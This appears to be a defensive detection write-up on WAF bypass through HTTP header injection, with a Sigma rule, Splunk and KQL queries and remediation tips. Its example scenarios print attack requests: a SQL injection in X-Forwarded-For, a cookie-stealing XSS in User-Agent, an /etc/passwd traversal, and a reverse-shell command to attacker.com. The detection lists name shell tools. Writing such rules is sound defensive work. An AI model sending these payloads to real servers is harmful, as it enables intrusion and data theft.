# dugganusa-008: WAF Bypass - HTTP Header Injection

**Category:** Web Application Security
**Severity:** High
**False Positive Rate:** Low (5-8%)
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

## Overview

Detects HTTP header injection attacks exploiting parsing discrepancies between WAFs and backend servers. Attackers inject malicious payloads (SQLi, XSS, command injection) via HTTP headers that WAFs don't properly inspect.

## The Problem

**Inconsistent Header Inspection:** WAFs often focus on request URI and body, neglecting custom headers like `X-Forwarded-For`, `User-Agent`, and `Referer`. Backend applications may parse these headers without sanitization.

**Common Attack Vectors:**
1. **X-Forwarded-For:** Trusted for IP whitelisting, but can contain SQLi/XSS
2. **User-Agent:** Logged to databases, vulnerable to injection
3. **Referer:** Used in analytics/tracking, reflected in responses

## Detection Logic

**Triggers on suspicious patterns in HTTP headers:**

- **X-Forwarded-For:** `<script`, `javascript:`, `onerror=`, `UNION`, `SELECT`, `../`
- **User-Agent:** `<script`, `javascript:`, `UNION SELECT`, `${{`, `<%=`, `/bin/bash`, `cmd.exe`
- **Referer:** `<script`, `javascript:`, `UNION SELECT`, `../../../`

**Sigma Rule:**

```yaml
title: WAF Bypass - HTTP Header Injection
id: dugganusa-008-header-injection
status: production
description: Malicious payloads in HTTP headers bypassing WAF inspection
author: DugganUSA LLC
date: 2025-11-19
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    category: webserver
detection:
    selection_headers:
        - x_forwarded_for|contains:
            - '<script'
            - 'javascript:'
            - 'onerror='
            - 'onload='
            - 'UNION'
            - 'SELECT'
            - '../'
            - '../../'
        - user_agent|contains:
            - '<script'
            - 'javascript:'
            - 'UNION SELECT'
            - '${{'
            - '<%='
            - '/bin/bash'
            - 'cmd.exe'
        - referer|contains:
            - '<script'
            - 'javascript:'
            - 'UNION SELECT'
            - '../../../'
    condition: selection_headers
fields:
    - src_ip
    - x_forwarded_for
    - user_agent
    - referer
falsepositives:
    - Misconfigured proxies
    - Legitimate automation tools
level: high
```

## SIEM Implementations

### Splunk SPL

```spl
index=web OR index=proxy
| where match(x_forwarded_for, "(?i)(<script|javascript:|onerror=|onload=|UNION|SELECT|\\.\\./)")
    OR match(user_agent, "(?i)(<script|javascript:|UNION SELECT|\\$\\{\\{|<%=|/bin/bash|cmd\\.exe)")
    OR match(referer, "(?i)(<script|javascript:|UNION SELECT|\\.\\./\\.\\./)")
| eval injection_type=case(
    match(x_forwarded_for, "(?i)(UNION|SELECT)"), "SQLi in X-Forwarded-For",
    match(user_agent, "(?i)(<script|javascript:)"), "XSS in User-Agent",
    match(user_agent, "(?i)(/bin/bash|cmd\\.exe)"), "Command Injection in User-Agent",
    match(referer, "(?i)(\\.\\./\\.\\./\\.\\./)"), "Path Traversal in Referer",
    1=1, "Header Injection"
  )
| stats count by src_ip, injection_type, user_agent, x_forwarded_for, referer
| eval severity="HIGH"
| eval mitre="T1190 - Exploit Public-Facing Application"
| table src_ip, injection_type, user_agent, x_forwarded_for, referer, count, severity
| sort -count
```

### KQL (Azure Sentinel)

```kql
// WAF Bypass - HTTP Header Injection Detection
W3CIISLog
| where TimeGenerated > ago(24h)
| extend XFF = tostring(AdditionalFields["x_forwarded_for"])
| extend UA = csUserAgent
| extend Ref = csReferer
| where
    XFF has_any ("<script", "javascript:", "onerror=", "UNION", "SELECT", "../") or
    UA has_any ("<script", "javascript:", "UNION SELECT", "${", "<%=", "/bin/bash", "cmd.exe") or
    Ref has_any ("<script", "javascript:", "UNION SELECT", "../../../")
| extend InjectionType = case(
    XFF has "UNION" or XFF has "SELECT", "SQLi in X-Forwarded-For",
    UA has "<script" or UA has "javascript:", "XSS in User-Agent",
    UA has "/bin/bash" or UA has "cmd.exe", "Command Injection in User-Agent",
    Ref has "../../../", "Path Traversal in Referer",
    "Header Injection"
  )
| summarize Count=count() by cIP, InjectionType, UA, XFF, Ref
| extend Severity = "High"
| extend MITRE = "T1190 - Exploit Public-Facing Application"
| sort by Count desc
```

## Example Attack Scenarios

### Scenario 1: SQLi via X-Forwarded-For

```http
GET /admin/logs HTTP/1.1
Host: example.com
X-Forwarded-For: 192.168.1.1' UNION SELECT password FROM users--
```

**Why this works:**
- Application logs `X-Forwarded-For` to database: `INSERT INTO access_log (ip) VALUES ('192.168.1.1' UNION...')`
- WAF doesn't inspect `X-Forwarded-For` for SQLi patterns
- Database executes UNION query

### Scenario 2: XSS via User-Agent

```http
GET /contact HTTP/1.1
Host: example.com
User-Agent: <script>alert(document.cookie)</script>
```

**Why this works:**
- Application reflects `User-Agent` in error pages or analytics
- WAF only checks request URI/body for XSS
- Stored XSS when User-Agent logged to admin panel

### Scenario 3: Command Injection via User-Agent

```http
GET /api/stats HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Why this works:**
- Application passes `User-Agent` to shell command (logging, analytics)
- WAF doesn't detect `/bin/bash` in User-Agent
- Reverse shell established

### Scenario 4: Path Traversal via Referer

```http
GET /download HTTP/1.1
Host: example.com
Referer: https://example.com/../../../etc/passwd
```

**Why this works:**
- Application uses `Referer` for access control or file operations
- WAF doesn't validate Referer for path traversal
- Sensitive file disclosure

## False Positives

**Moderate false positive rate (5-8%) due to:**

1. **Misconfigured Proxies:** May inject strange X-Forwarded-For values
2. **Legitimate Automation:** Tools with unusual User-Agent strings
3. **URL Encoding:** Normal characters encoded in Referer

**Mitigation:**
- Whitelist known proxy IPs
- Exclude internal testing User-Agents
- Validate legitimate automation tools (CI/CD pipelines)

## Remediation

**Immediate Response:**

1. **Block IP:** Add source to blocklist
2. **Review Logs:** Check if injection succeeded
3. **Sanitize Headers:** Validate/escape all HTTP headers server-side
4. **WAF Update:** Enable header inspection in WAF rules

**Long-term Hardening:**

```python
# Example: Sanitize X-Forwarded-For in Python/Flask
from flask import request
import re

def sanitize_xff():
    xff = request.headers.get('X-Forwarded-For', '')
    # Remove SQL/XSS patterns
    if re.search(r'(UNION|SELECT|<script|javascript:)', xff, re.I):
        return '0.0.0.0'  # Suspicious - reject
    return xff
```

**WAF Configuration:**
- **AWS WAF:** Enable "Header inspection" in managed rules
- **Cloudflare:** Add custom rule for User-Agent/Referer patterns
- **ModSecurity:** `SecRule REQUEST_HEADERS:User-Agent "@rx (UNION|SELECT|<script)" "id:1000,deny"`

## References

- **OWASP Header Injection:** https://owasp.org/www-community/attacks/HTTP_Header_Injection
- **MITRE ATT&CK T1190:** https://attack.mitre.org/techniques/T1190/

## Attribution

**Research:** WAFFLED (PortSwigger Research, 2025) + OWASP Testing Guide
**Implementation:** DugganUSA LLC
**License:** Free for non-commercial use. Commercial use requires attribution.

---

**Democratic Sharing Law** - Headers are the forgotten input vector. Free detection rules remind defenders what WAFs miss.
